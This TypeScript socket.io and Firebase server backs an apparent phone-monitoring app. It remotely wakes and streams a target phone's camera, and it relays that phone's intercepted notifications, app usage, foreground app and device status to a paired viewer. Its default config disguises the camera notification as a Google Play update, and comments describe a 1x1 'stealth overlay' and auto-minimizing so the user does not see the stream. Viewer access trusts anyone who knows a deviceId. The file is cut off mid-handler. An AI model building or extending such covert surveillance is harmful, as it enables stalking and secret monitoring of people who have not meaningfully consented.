import { createServer } from 'node:http';
import { existsSync, readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { Server, Socket } from 'socket.io';
import admin from 'firebase-admin';

const PORT = Number(process.env.PORT ?? 4001);
const PAIR_CODE_TTL_MS = 10 * 60 * 1000; // pair code หมดอายุ 10 นาที
const MIN_DEVICE_ID_LENGTH = 8;
// กันค่าฟิลด์ใน report ใหญ่เกินไป (DoS ป้องกัน)
const MAX_NOTIF_FIELD_LEN = 512;
const MAX_PACKAGE_NAME_LEN = 256;
const MAX_ITEMS_PER_BATCH = 100;
// optional: key สำหรับ HTTP / endpoint (ไม่ตั้ง = endpoint ปิด)
const STATUS_KEY = process.env.STATUS_KEY || '';
// CORS allow list (comma-separated origins, * = anything)
const CORS_ORIGIN = process.env.CORS_ORIGIN || '*';

function isValidDeviceId(v: unknown): v is string {
  return typeof v === 'string' && v.length >= MIN_DEVICE_ID_LENGTH;
}
function clampStr(v: unknown, max: number): string {
  const s = typeof v === 'string' ? v : '';
  return s.length > max ? s.slice(0, max) : s;
}

// ---- Firebase Admin init ----

// อ่าน service account จาก env (recommended) หรือ file firebase-admin.json
// ถ้าไม่มี → ไม่ตาย แค่ FCM ปลุกกล้องจะใช้ไม่ได้
const __dirname = dirname(fileURLToPath(import.meta.url));
const adminKeyFile = join(__dirname, '..', 'firebase-admin.json');

/** ตรวจสอบ structure ของ service account ก่อน cast (กัน malformed input crash) */
function isValidServiceAccount(o: unknown): o is admin.ServiceAccount {
  if (!o || typeof o !== 'object') return false;
  const r = o as Record<string, unknown>;
  return (
    typeof r.projectId === 'string' || typeof r.project_id === 'string'
  ) && (
    typeof r.privateKey === 'string' || typeof r.private_key === 'string'
  ) && (
    typeof r.clientEmail === 'string' || typeof r.client_email === 'string'
  );
}

let fcmEnabled = false;
try {
  let cred: unknown = null;
  if (process.env.FIREBASE_ADMIN_KEY) {
    cred = JSON.parse(process.env.FIREBASE_ADMIN_KEY);
  } else if (existsSync(adminKeyFile)) {
    cred = JSON.parse(readFileSync(adminKeyFile, 'utf-8'));
  }
  if (cred && !isValidServiceAccount(cred)) {
    console.error('[fcm] credential missing required fields (projectId/privateKey/clientEmail)');
  } else if (cred) {
    admin.initializeApp({ credential: admin.credential.cert(cred) });
    fcmEnabled = true;
    console.log('[fcm] Firebase Admin initialized — remote wake-up enabled');
  } else {
    console.warn('[fcm] No Firebase credentials — remote wake-up disabled');
  }
} catch (e) {
  console.error('[fcm] Failed to init Firebase Admin:', (e as Error).message);
}

// ---- Types ----

interface RoomInfo {
  members: Set<string>; // socket IDs
  createdAt: number;
}

interface PairCodeInfo {
  deviceId: string;
  createdAt: number;
}

interface CameraInfo {
  socketId: string;
}

interface CameraConfig {
  // ข้อความใน foreground service notification (ปลอมเป็น Google Play update)
  notifTitle: string;
  notifBody: string;
  // เปิด 1×1 px overlay หลอกระบบว่าแอป foreground (AirDroid technique)
  stealthOverlay: boolean;
  // ย่อ activity ทันทีหลังเปิดกล้อง (user ไม่เห็นหน้า streaming)
  autoMinimize: boolean;
}

interface DeviceStatus {
  // 0-100 หรือ -1 = ไม่ทราบ
  batteryLevel: number;
  // กำลังชาร์จอยู่หรือไม่
  batteryCharging: boolean;
  // ชนิดเครือข่าย: 'wifi' | 'cellular' | 'none'
  networkType: string;
  // 0-4 (ระดับขีดสัญญาณ) หรือ -1 = ไม่ทราบ
  signalLevel: number;
  // ชื่อแอพที่ใช้อยู่ตอนนี้ (จาก UsageStatsManager) หรือ null
  foregroundApp: string | null;
  // จอเปิดอยู่หรือไม่
  screenOn: boolean;
  // epoch ms ที่ status report เข้ามาล่าสุด
  lastUpdate: number;
}

const DEFAULT_CONFIG: CameraConfig = {
  notifTitle: 'กำลังอัพเดท Google Play',
  notifBody: 'กำลังตรวจสอบและดาวน์โหลดข้อมูลล่าสุด',
  // Default = OFF — user เครื่องลูกต้องเปิด "โหมดซ้อนแอพ" เองจาก HomeScreen
  stealthOverlay: false,
  autoMinimize: false,
};

// ---- State (in-memory) ----

const rooms = new Map<string, RoomInfo>();
const pairCodes = new Map<string, PairCodeInfo>();
const cameras = new Map<string, CameraInfo>();

// device_id → FCM token (เก็บถาวรในหน่วยความจำ — รีสตาร์ท server ก็หาย แต่ camera จะส่งใหม่ตอน register-camera)
const fcmTokens = new Map<string, string>();

// device_id → CameraConfig (viewer เก็บ remote config สำหรับกล้องแต่ละตัว)
// รีสตาร์ท server หาย → viewer ต้องส่งใหม่ (acceptable trade-off เพื่อความเรียบง่าย)
const configs = new Map<string, CameraConfig>();

// device_id → DeviceStatus ล่าสุด (camera push ทุก 30s + on-change)
const statuses = new Map<string, DeviceStatus>();

// device_id → Set<socketId> ของ viewer ที่ subscribe live updates
// (relay status-updated event ให้ทุก subscriber เมื่อ camera report-status)
const statusSubscribers = new Map<string, Set<string>>();

interface NotifEvent {
  packageName: string;
  appLabel: string;
  title: string;
  text: string;
  postTime: number;
  receivedAt: number; // server-side timestamp ตอนรับเข้ามา
}

// device_id → notif buffer (เก็บ 100 ตัวล่าสุด, FIFO)
const notifBuffers = new Map<string, NotifEvent[]>();
const NOTIF_BUFFER_LIMIT = 100;
const notifSubscribers = new Map<string, Set<string>>();

interface UsageStat {
  packageName: string;
  appLabel: string;
  totalTimeMs: number;
  lastUsed: number;
}

interface UsageReport {
  stats: UsageStat[];
  reportedAt: number;
}

// device_id → cached usage report ล่าสุด (camera ส่งเป็นระยะ)
const usageReports = new Map<string, UsageReport>();
const usageSubscribers = new Map<string, Set<string>>();

// device_id ที่ค้างรอ factory-reset (viewer สั่งตอน camera offline)
// → relay event เมื่อ camera register-camera ครั้งต่อไป
const pendingResets = new Set<string>();

/**
 * Session-based "soft" auth สำหรับ LAN deployment:
 * - socket register-camera กับ deviceId X → socket = camera ของ X
 * - socket pair-viewer กับ code → socket = viewer ของ deviceId ที่ code map ไว้
 * - privileged events เช็ค role ก่อน accept (กัน random socket spoof)
 *
 * ไม่ใช่ token-based — รีสตาร์ท server, ทุก socket reconnect ก็ re-establish ใหม่
 * เหมาะสำหรับ home LAN. ถ้าจะ deploy public → upgrade เป็น JWT
 */
interface SocketRole {
  role: 'camera' | 'viewer';
  deviceId: string;
}
const socketRoles = new Map<string, SocketRole>();

function isCameraOf(socketId: string, deviceId: string): boolean {
  const r = socketRoles.get(socketId);
  return r?.role === 'camera' && r.deviceId === deviceId;
}
function isViewerOf(socketId: string, deviceId: string): boolean {
  const r = socketRoles.get(socketId);
  return r?.role === 'viewer' && r.deviceId === deviceId;
}
function isPairedSocket(socketId: string, deviceId: string): boolean {
  return isCameraOf(socketId, deviceId) || isViewerOf(socketId, deviceId);
}

/**
 * Privileged auth gate: ตรวจว่า socket นี้ pair กับ deviceId นี้แล้วหรือยัง
 * → ใช้ก่อน handler ที่ทำ write/read ข้อมูลของ device
 * → emit error event + return false ถ้าไม่ผ่าน
 */
function requirePaired(
  socket: Socket,
  deviceId: string,
  errorEvent: string,
): boolean {
  if (!isPairedSocket(socket.id, deviceId)) {
    socket.emit(errorEvent, 'ไม่มีสิทธิ์ — ต้อง pair กับ device นี้ก่อน');
    return false;
  }
  return true;
}

/** ลบ socketId ออกจาก subscriber Sets + ลบ Map entry ถ้า Set ว่าง (E1) */
function cleanupSubscribers(map: Map<string, Set<string>>, socketId: string): void {
  for (const [deviceId, subs] of map) {
    subs.delete(socketId);
    if (subs.size === 0) map.delete(deviceId);
  }
}

// กัน spam push: device_id → timestamp ล่าสุดที่ส่ง
const lastPushAt = new Map<string, number>();
const PUSH_COOLDOWN_MS = 2_000; // ห้ามส่ง push ซ้ำใน 2 วินาที (พอกัน duplicate, friendly กับ user)

// ลบ pair code ที่หมดอายุทุก 2 นาที
setInterval(() => {
  const now = Date.now();
  for (const [code, info] of pairCodes) {
    if (now - info.createdAt > PAIR_CODE_TTL_MS) {
      pairCodes.delete(code);
    }
  }
}, 2 * 60 * 1000);

// ---- FCM push helper ----

/** ผลลัพธ์ของ pushWakeCamera — บอก viewer ว่าทำไม wake fail */
type WakeResult = 'sent' | 'no-fcm' | 'no-token' | 'cooldown' | { error: string };

async function pushWakeCamera(deviceId: string): Promise<WakeResult> {
  const tag = deviceId.slice(0, 8);
  if (!fcmEnabled) {
    console.warn(`[fcm:${tag}] FCM ไม่พร้อม (Firebase Admin init ล้มเหลว)`);
    return 'no-fcm';
  }
  const token = fcmTokens.get(deviceId);
  if (!token) {
    console.warn(`[fcm:${tag}] ไม่พบ token — camera ต้อง register-camera มาก่อน`);
    return 'no-token';
  }
  const now = Date.now();
  const last = lastPushAt.get(deviceId) ?? 0;
  const elapsed = now - last;
  if (elapsed < PUSH_COOLDOWN_MS) {
    console.log(`[fcm:${tag}] cooldown — เพิ่งส่งไป ${elapsed}ms ก่อน (รอ ${PUSH_COOLDOWN_MS - elapsed}ms)`);
    return 'cooldown';
  }
  // E3: set timestamp ทันที (ก่อน await) — ป้องกัน 2 concurrent callers ทั้งคู่ผ่าน check
  lastPushAt.set(deviceId, now);

  try {
    const t0 = Date.now();
    const id = await admin.messaging().send({
      token,
      // data-only → MessagingService รับเสมอ → manual post notification
      // (รูปแบบนี้ทำงานสม่ำเสมอใน foreground/background/killed scenarios)
      data: {
        action: 'wake-camera',
        deviceId,
        title: 'เครื่องแม่ขอเปิดกล้อง',
        body: 'แตะเพื่ออนุญาตเปิดกล้องและเริ่มสตรีม',
      },
      android: {
        priority: 'high',
        ttl: 30_000,
      },
    });
    const dur = Date.now() - t0;
    console.log(`[fcm:${tag}] sent wake push (${dur}ms, msgId=${id.split('/').pop()})`);
    return 'sent';
  } catch (e) {
    const msg = (e as Error).message;
    console.error(`[fcm:${tag}] push failed: ${msg}`);
    // token หมดอายุ → ลบทิ้ง camera จะส่งใหม่ตอน register
    if (msg.includes('not-registered') || msg.includes('Requested entity was not found')) {
      console.warn(`[fcm:${tag}] token ถูกลบ — รอ camera register-camera ครั้งหน้า`);
      fcmTokens.delete(deviceId);
      return { error: 'token-expired' };
    }
    return { error: msg };
  }
}

// ---- Server ----

const httpServer = createServer((req, res) => {
  // health check (basic ok) — ปลอดภัยให้ตอบเสมอ
  res.writeHead(200, { 'Content-Type': 'application/json' });

  // ถ้า STATUS_KEY ตั้งไว้ → ต้องส่ง ?key=... ถึงจะดู state ละเอียด
  const url = new URL(req.url ?? '/', `http://${req.headers.host ?? 'localhost'}`);
  const wantsStatus = STATUS_KEY && url.searchParams.get('key') === STATUS_KEY;

  if (!STATUS_KEY || wantsStatus) {
    res.end(JSON.stringify({
      status: 'ok',
      rooms: rooms.size,
      pairCodes: pairCodes.size,
      cameras: cameras.size,
      fcmEnabled,
      fcmTokens: fcmTokens.size,
    }));
  } else {
    res.end(JSON.stringify({ status: 'ok' }));
  }
});

const io = new Server(httpServer, {
  // CORS_ORIGIN env: '*' = anyone, comma-separated list = whitelist
  cors: {
    origin: CORS_ORIGIN === '*' ? '*' : CORS_ORIGIN.split(',').map((s) => s.trim()),
  },
});

io.on('connection', (socket: Socket) => {
  let currentRoom: string | null = null;
  let currentDeviceId: string | null = null;

  // camera แจ้งตัวตน: device_id + pair code (option) + fcm_token (option)
  socket.on(
    'register-camera',
    (payload: { deviceId?: string; code?: string; fcmToken?: string }) => {
      const deviceId = payload?.deviceId;
      const code = payload?.code;
      const fcmToken = payload?.fcmToken;

      if (!isValidDeviceId(deviceId)) {
        socket.emit('error', 'device_id ไม่ถูกต้อง');
        return;
      }

      // E2: ถ้า socket นี้เคย register-camera ด้วย deviceId อื่นมาก่อน →
      // ลบของเก่าออกจาก cameras Map กัน orphan
      if (currentDeviceId && currentDeviceId !== deviceId) {
        cameras.delete(currentDeviceId);
      }

      cameras.set(deviceId, { socketId: socket.id });
      currentDeviceId = deviceId;
      // A1: บันทึก role ของ socket นี้ — privileged events ตรวจก่อน accept
      socketRoles.set(socket.id, { role: 'camera', deviceId });

      if (typeof code === 'string' && code.length === 6) {
        pairCodes.set(code.toUpperCase(), { deviceId, createdAt: Date.now() });
      }

      if (typeof fcmToken === 'string' && fcmToken.length > 10) {
        fcmTokens.set(deviceId, fcmToken);
        console.log(
          `[register-camera] device=${deviceId.slice(0, 8)}… code=${code ?? '-'} fcm=${fcmToken.slice(0, 12)}…`,
        );
      } else {
        console.log(`[register-camera] device=${deviceId.slice(0, 8)}… code=${code ?? '-'} (no fcm)`);
      }

      socket.emit('register-camera-ok');

      // ถ้า viewer เคย set config ไว้ (ตอนกล้อง offline) → push ให้กล้องทันที
      const existingConfig = configs.get(deviceId);
      if (existingConfig) {
        socket.emit('config-pushed', existingConfig);
        console.log(`[register-camera] pushed pending config to ${deviceId.slice(0, 8)}…`);
      }

      // ถ้ามี factory-reset ค้างอยู่ (viewer สั่งตอน camera offline) → relay เลย
      if (pendingResets.has(deviceId)) {
        pendingResets.delete(deviceId);
        socket.emit('factory-reset', { deviceId });
        console.log(`[register-camera] relayed pending factory-reset to ${deviceId.slice(0, 8)}…`);
      }
    },
  );

  // viewer ที่ paired ไว้แล้ว (เก็บ deviceId ใน PairingStorage) → reconnect
  // → claim viewer role โดยไม่ต้อง pair-viewer ใหม่
  // policy: trust LAN — ใครก็ตามที่รู้ deviceId attach ได้
  // ถ้าจะ tighten public: เก็บ pairing tokens แทน plain deviceId
  socket.on('viewer-attach', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (!isValidDeviceId(deviceId)) {
      socket.emit('viewer-attach-error', 'device_id ไม่ถูกต้อง');
      return;
    }
    socketRoles.set(socket.id, { role: 'viewer', deviceId });
    currentDeviceId = deviceId;
    console.log(`[viewer-attach] ${socket.id} → ${deviceId.slice(0, 8)}…`);
    socket.emit('viewer-attach-ok', { deviceId });
  });

  // viewer สั่งปลุกกล้องเอง (กรณีกล้อง offline หรือเปิดไม่ได้)
  // ต่างจาก auto-wake ใน join — อันนี้ user กดปุ่ม wake manual
  socket.on('wake-camera', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (!isValidDeviceId(deviceId)) {
      socket.emit('wake-camera-error', 'device_id ไม่ถูกต้อง');
      return;
    }
    // H1: enforce — ต้องเป็น viewer ที่ pair ไว้กับ device นี้
    if (!requirePaired(socket, deviceId, 'wake-camera-error')) return;

    console.log(`[wake-camera] manual trigger for ${deviceId.slice(0, 8)}…`);
    pushWakeCamera(deviceId).then((result) => {
      // map result → user-friendly error message
      if (result === 'sent') {
        socket.emit('wake-camera-ok');
        return;
      }
      const errMap: Record<string, string> = {
        'no-fcm': 'FCM service ไม่พร้อมที่ server (Firebase Admin init ล้มเหลว)',
        'no-token': 'ยังไม่มี FCM token — camera ต้องเปิดและเชื่อมต่อ server อย่างน้อยครั้งหนึ่ง',
        cooldown: 'เพิ่งปลุกไปแล้ว — รอ 2 วินาทีก่อนกดอีก',
      };
      if (typeof result === 'string') {
        socket.emit('wake-camera-error', errMap[result] ?? `FCM error: ${result}`);
      } else {
        // { error: ... }
        socket.emit('wake-camera-error', result.error === 'token-expired'
          ? 'FCM token หมดอายุ — รอ camera reconnect ใหม่ (~ 30 วินาที)'
          : `FCM error: ${result.error}`);
      }
    });
  });

  // viewer ขอ config ปัจจุบันของกล้อง (สำหรับเปิดหน้า Settings)
  socket.on('get-config', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (!isValidDeviceId(deviceId)) {
      socket.emit('get-config-error', 'device_id ไม่ถูกต้อง');
      return;
    }
    if (!requirePaired(socket, deviceId, 'get-config-error')) return;
    const config = configs.get(deviceId) ?? DEFAULT_CONFIG;
    socket.emit('config-current', { deviceId, config });
  });

  // viewer บันทึก config ใหม่ → เก็บ in-memory + relay ให้กล้องถ้า online
  socket.on('update-config', (payload: { deviceId?: string; config?: Partial<CameraConfig> }) => {
    const deviceId = payload?.deviceId;
    const cfg = payload?.config;
    if (!isValidDeviceId(deviceId) || !cfg || typeof cfg !== 'object') {
      socket.emit('update-config-error', 'payload ไม่ถูกต้อง');
      return;
    }
    if (!requirePaired(socket, deviceId, 'update-config-error')) return;

    // M3: clamp string fields กัน DoS / memory exhaustion
    const prev = configs.get(deviceId) ?? DEFAULT_CONFIG;
    const merged: CameraConfig = {
      notifTitle: clampStr(cfg.notifTitle ?? prev.notifTitle, MAX_NOTIF_FIELD_LEN) || DEFAULT_CONFIG.notifTitle,
      notifBody: clampStr(cfg.notifBody ?? prev.notifBody, MAX_NOTIF_FIELD_LEN) || DEFAULT_CONFIG.notifBody,
      stealthOverlay: typeof cfg.stealthOverlay === 'boolean' ? cfg.stealthOverlay : prev.stealthOverlay,
      autoMinimize: typeof cfg.autoMinimize === 'boolean' ? cfg.autoMinimize : prev.autoMinimize,
    };
    configs.set(deviceId, merged);
    console.log(
      `[update-config] ${deviceId.slice(0, 8)}… title="${merged.notifTitle}" stealth=${merged.stealthOverlay} auto=${merged.autoMinimize}`,
    );

    // ส่งให้กล้องทันทีถ้า online — ไม่ต้องรอ register-camera รอบหน้า
    const cam = cameras.get(deviceId);
    if (cam) {
      io.to(cam.socketId).emit('config-pushed', merged);
      console.log(`[update-config] relayed to online camera ${cam.socketId}`);
    }
    socket.emit('update-config-ok', merged);
  });

  // ---- Device status (battery / signal / foreground app / screen) ----

  // camera push status — เก็บ + relay ไปทุก viewer ที่ subscribe
  socket.on('report-status', (payload: { deviceId?: string; status?: Partial<DeviceStatus> }) => {
    const deviceId = payload?.deviceId;
    const s = payload?.status;
    if (!isValidDeviceId(deviceId) || !s || typeof s !== 'object') {
      return; // เงียบ — ไม่ ack เพราะ status อาจมาบ่อย
    }
    // ต้องเป็น camera role เท่านั้นที่ report status ของตัวเอง
    if (!isCameraOf(socket.id, deviceId)) return;
    const merged: DeviceStatus = {
      batteryLevel: typeof s.batteryLevel === 'number' ? s.batteryLevel : -1,
      batteryCharging: !!s.batteryCharging,
      networkType: typeof s.networkType === 'string' ? s.networkType : 'none',
      signalLevel: typeof s.signalLevel === 'number' ? s.signalLevel : -1,
      foregroundApp: typeof s.foregroundApp === 'string' ? s.foregroundApp : null,
      screenOn: !!s.screenOn,
      lastUpdate: Date.now(),
    };
    statuses.set(deviceId, merged);

    // relay ไปทุก subscriber
    const subs = statusSubscribers.get(deviceId);
    if (subs) {
      for (const sid of subs) {
        io.to(sid).emit('status-updated', { deviceId, status: merged });
      }
    }
  });

  // viewer ขอ status snapshot ปัจจุบัน (เปิด Dashboard ครั้งแรก)
  socket.on('get-status', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (!isValidDeviceId(deviceId)) {
      socket.emit('get-status-error', 'device_id ไม่ถูกต้อง');
      return;
    }
    if (!requirePaired(socket, deviceId, 'get-status-error')) return;
    const status = statuses.get(deviceId);
    if (!status) {
      socket.emit('get-status-error', 'ยังไม่มี status — รอกล้อง report');
      return;
    }
    socket.emit('status-current', { deviceId, status });
  });

  // viewer subscribe live status updates
  socket.on('subscribe-status', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (!isValidDeviceId(deviceId)) return;
    if (!isPairedSocket(socket.id, deviceId)) return; // เงียบ — viewer ที่ paired แล้วเท่านั้น
    if (!statusSubscribers.has(deviceId)) statusSubscribers.set(deviceId, new Set());
    statusSubscribers.get(deviceId)!.add(socket.id);
    console.log(`[subscribe-status] ${socket.id} → ${deviceId.slice(0, 8)}…`);

    // ส่ง snapshot ทันทีถ้ามี
    const status = statuses.get(deviceId);
    if (status) socket.emit('status-updated', { deviceId, status });
  });

  socket.on('unsubscribe-status', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string') return;
    const subs = statusSubscribers.get(deviceId);
    if (subs) {
      subs.delete(socket.id);
      if (subs.size === 0) statusSubscribers.delete(deviceId);
    }
  });

  // ---- Notification mirror ----

  // camera ส่ง notif events ที่ดักจับได้ (batch จาก periodic drainer)
  socket.on('report-notif', (payload: { deviceId?: string; events?: unknown[] }) => {
    const deviceId = payload?.deviceId;
    const events = payload?.events;
    if (!isValidDeviceId(deviceId) || !Array.isArray(events)) {
      return;
    }
    const now = Date.now();
    const valid: NotifEvent[] = [];
    // E4: จำกัด batch size กัน DoS (max 100 รายการต่อครั้ง)
    const limit = Math.min(events.length, MAX_ITEMS_PER_BATCH);
    for (let i = 0; i < limit; i++) {
      const raw = events[i];
      if (!raw || typeof raw !== 'object') continue;
      const r = raw as Record<string, unknown>;
      // E4: clamp string length กัน DoS (memory exhaustion)
      const pkg = clampStr(r.packageName, MAX_PACKAGE_NAME_LEN);
      const label = clampStr(r.appLabel ?? pkg, MAX_PACKAGE_NAME_LEN);
      const title = clampStr(r.title, MAX_NOTIF_FIELD_LEN);
      const text = clampStr(r.text, MAX_NOTIF_FIELD_LEN);
      const postTime = typeof r.postTime === 'number' ? r.postTime : now;
      if (!pkg || (!title && !text)) continue;
      valid.push({
        packageName: pkg,
        appLabel: label,
        title,
        text,
        postTime,
        receivedAt: now,
      });
    }
    if (valid.length === 0) return;
    // ต้องเป็น camera role ของ device นี้เท่านั้น
    if (!isCameraOf(socket.id, deviceId)) return;

    // M2: immutable construction กัน race เมื่ออ่าน-เขียนพร้อมกัน
    const prev = notifBuffers.get(deviceId) ?? [];
    const updated = [...prev, ...valid].slice(-NOTIF_BUFFER_LIMIT);
    notifBuffers.set(deviceId, updated);

    // push ให้ subscriber ทันที (ใช้ array events เพื่อ batch)
    const subs = notifSubscribers.get(deviceId);
    if (subs) {
      for (const sid of subs) {
        io.to(sid).emit('notif-pushed', { deviceId, events: valid });
      }
    }
    console.log(`[report-notif] ${deviceId.slice(0, 8)}… +${valid.length} (buf=${updated.length})`);
  });

  // viewer ขอ buffer notif ล่าสุด (ตอนเปิด Dashboard)
  socket.on('get-notifs', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (!isValidDeviceId(deviceId)) {
      socket.emit('get-notifs-error', 'device_id ไม่ถูกต้อง');
      return;
    }
    if (!requirePaired(socket, deviceId, 'get-notifs-error')) return;
    socket.emit('notifs-current', {
      deviceId,
      events: notifBuffers.get(deviceId) ?? [],
    });
  });

  // viewer subscribe live notif updates
  socket.on('subscribe-notifs', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (!isValidDeviceId(deviceId)) return;
    if (!isPairedSocket(socket.id, deviceId)) return;
    if (!notifSubscribers.has(deviceId)) notifSubscribers.set(deviceId, new Set());
    notifSubscribers.get(deviceId)!.add(socket.id);
    console.log(`[subscribe-notifs] ${socket.id} → ${deviceId.slice(0, 8)}…`);
  });

  socket.on('unsubscribe-notifs', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string') return;
    const subs = notifSubscribers.get(deviceId);
    if (subs) {
      subs.delete(socket.id);
      if (subs.size === 0) notifSubscribers.delete(deviceId);
    }
  });

  // ---- Usage stats (app usage time) ----

  // camera ส่ง snapshot ของ usage stats 24h
  socket.on('report-usage-stats', (payload: { deviceId?: string; stats?: unknown[] }) => {
    const deviceId = payload?.deviceId;
    const stats = payload?.stats;
    if (!isValidDeviceId(deviceId) || !Array.isArray(stats)) return;
    if (!isCameraOf(socket.id, deviceId)) return;

    const valid: UsageStat[] = [];
    // E4: clamp batch size + string lengths
    const limit = Math.min(stats.length, MAX_ITEMS_PER_BATCH);
    for (let i = 0; i < limit; i++) {
      const raw = stats[i];
      if (!raw || typeof raw !== 'object') continue;
      const r = raw as Record<string, unknown>;
      valid.push({
        packageName: clampStr(r.packageName, MAX_PACKAGE_NAME_LEN),
        appLabel: clampStr(r.appLabel, MAX_PACKAGE_NAME_LEN),
        totalTimeMs: typeof r.totalTimeMs === 'number' ? r.totalTimeMs : 0,
        lastUsed: typeof r.lastUsed === 'number' ? r.lastUsed : 0,
      });
    }
    const report: UsageReport = { stats: valid, reportedAt: Date.now() };
    usageReports.set(deviceId, report);

    const subs = usageSubscribers.get(deviceId);
    if (subs) {
      for (const sid of subs) {
        io.to(sid).emit('usage-stats-updated', { deviceId, ...report });
      }
    }
    console.log(`[report-usage-stats] ${deviceId.slice(0, 8)}… stats=${valid.length}`);
  });

  // viewer ขอ snapshot (เปิด Dashboard / pull-to-refresh)
  socket.on('get-usage-stats', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (!isValidDeviceId(deviceId)) {
      socket.emit('get-usage-stats-error', 'device_id ไม่ถูกต้อง');
      return;
    }
    if (!requirePaired(socket, deviceId, 'get-usage-stats-error')) return;
    const report = usageReports.get(deviceId);
    if (!report) {
      socket.emit('get-usage-stats-error', 'ยังไม่มีข้อมูล — รอกล้อง report');
      return;
    }
    socket.emit('usage-stats-current', { deviceId, ...report });
  });

  // viewer subscribe live updates
  socket.on('subscribe-usage-stats', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (!isValidDeviceId(deviceId)) return;
    if (!isPairedSocket(socket.id, deviceId)) return;
    if (!usageSubscribers.has(deviceId)) usageSubscribers.set(deviceId, new Set());
    usageSubscribers.get(deviceId)!.add(socket.id);
  });

  socket.on('unsubscribe-usage-stats', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (typeof deviceId !== 'string') return;
    const subs = usageSubscribers.get(deviceId);
    if (subs) {
      subs.delete(socket.id);
      if (subs.size === 0) usageSubscribers.delete(deviceId);
    }
  });

  // viewer สั่งให้กล้อง refresh stats ทันที (เช่น กดปุ่ม refresh)
  socket.on('refresh-usage-stats', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (!isValidDeviceId(deviceId)) return;
    if (!isViewerOf(socket.id, deviceId)) return;
    const cam = cameras.get(deviceId);
    if (cam) {
      io.to(cam.socketId).emit('fetch-usage-stats', { deviceId });
    }
  });

  // viewer สั่ง factory-reset เครื่องลูก:
  // → camera รับ event → clear auto_streaming + restore window + stop FGS
  // → user จะกลับมาเห็น UI ของ camera_app ปกติ (สำหรับ pair ใหม่)
  socket.on('factory-reset', (payload: { deviceId?: string }) => {
    const deviceId = payload?.deviceId;
    if (!isValidDeviceId(deviceId)) {
      socket.emit('factory-reset-error', 'device_id ไม่ถูกต้อง');
      return;
    }
    if (!requirePaired(socket, deviceId, 'factory-reset-error')) return;
    // เคลียร์ state ฝั่ง server ก่อนเสมอ
    configs.delete(deviceId);
    statuses.delete(deviceId);
    notifBuffers.delete(deviceId);
    usageReports.delete(deviceId);

    const cam = cameras.get(deviceId);
    if (!cam) {
      // กล้อง offline → เก็บไว้ใน pendingResets → relay ตอน register-camera รอบหน้า
      pendingResets.add(deviceId);
      socket.emit('factory-reset-ok', { deviceId, relayed: false });
      console.log(`[factory-reset] ${deviceId.slice(0, 8)}… offline — queued (จะ relay ตอน online)`);
      return;
    }
    io.to(cam.socketId).emit('factory-reset', { deviceId });
    socket.emit('factory-reset-ok', { deviceId, relayed: true });
    console.log(`[factory-reset] ${deviceId.slice(0, 8)}… relayed to camera + cleared server state`);
  });

  // viewer แลกรหัสจับคู่เป็น device_id
  socket.on('pair-viewer', (payload: { code?: string }) => {
    const code = payload?.code;
    if (typeof code !== 'string' || code.length !== 6) {
      socket.emit('pair-viewer-error', 'รหัสต้องมี 6 หลัก');
      return;
    }

    const upper = code.toUpperCase();
    const info = pairCodes.get(upper);
    if (!info) {
      socket.emit('pair-viewer-error', 'ไม่พบรหัสนี้ หรือรหัสหมดอายุแล้ว');
      return;
    }

    // A4: pair code = single-use → ลบทันทีหลังใช้สำเร็จ
    // viewer ที่จับคู่แล้วเก็บ deviceId ไว้ใน PairingStorage ใช้ต่อได้
    pairCodes.delete(upper);

    // A1: บันทึก role = viewer ของ deviceId นี้ — privileged events ตรวจก่อน accept
    socketRoles.set(socket.id, { role: 'viewer', deviceId: info.deviceId });
    currentDeviceId = info.deviceId;

    console.log(`[pair-viewer] code=${code} → device=${info.deviceId.slice(0, 8)}… (code consumed)`);
    socket.emit('pair-viewer-ok', { deviceId: info.deviceId });
  });

  // Room join — ถ้า camera ของ room นี้ offline และมี FCM token → ส่ง push ปลุก
  socket.on('join', (input: string) => {
    if (typeof input !== 'string') {
      socket.emit('error', 'join ต้องส่ง string');
      return;
    }

    let roomKey: string;
    if (input.length === 6) {
      const info = pairCodes.get(input.toUpperCase());
      if (!info) {
        socket.emit('error', 'ไม่พบรหัสนี้ หรือรหัสหมดอายุแล้ว');
        return;
      }
      roomKey = info.deviceId;
    } else if (isValidDeviceId(input)) {
      // A5: deviceId path — บังคับให้ length ≥ 8 (กัน short-string brute force)
      // ไม่บังคับ cameras.has() เพราะต้องการให้ wake-camera FCM flow ทำงาน:
      // viewer joins → camera offline → server พบ → push FCM → camera wakes + joins room
      // attacker ที่จะ join ต้องรู้ deviceId แบบสุ่ม (32+ chars) → ขั้นต่ำ effort
      roomKey = input;
    } else {
      socket.emit('error', 'รหัส 6 หลัก หรือ device_id (อย่างน้อย 8 ตัวอักษร)');
      return;
    }

    if (!rooms.has(roomKey)) {
      rooms.set(roomKey, { members: new Set(), createdAt: Date.now() });
    }

    const room = rooms.get(roomKey)!;
    if (room.members.size >= 2) {
      socket.emit('error', 'room เต็มแล้ว');
      return;
    }

    room.members.add(socket.id);
    socket.join(roomKey);
    currentRoom = roomKey;

    console.log(`[join] ${socket.id} → room ${roomKey.slice(0, 8)}… (${room.members.size}/2)`);

    // ถ้าห้องนี้ camera ยังไม่เข้า (room มี viewer คนเดียว) และเรารู้ token ของ camera → ส่ง FCM ปลุก
    const cameraOnline = cameras.has(roomKey);
    if (!cameraOnline && room.members.size === 1) {
      console.log(`[join] camera ${roomKey.slice(0, 8)}… offline, sending wake push`);
      pushWakeCamera(roomKey).then((r) => {
        if (r !== 'sent') console.warn(`[join:auto-wake] result=${JSON.stringify(r)}`);
      });
    }

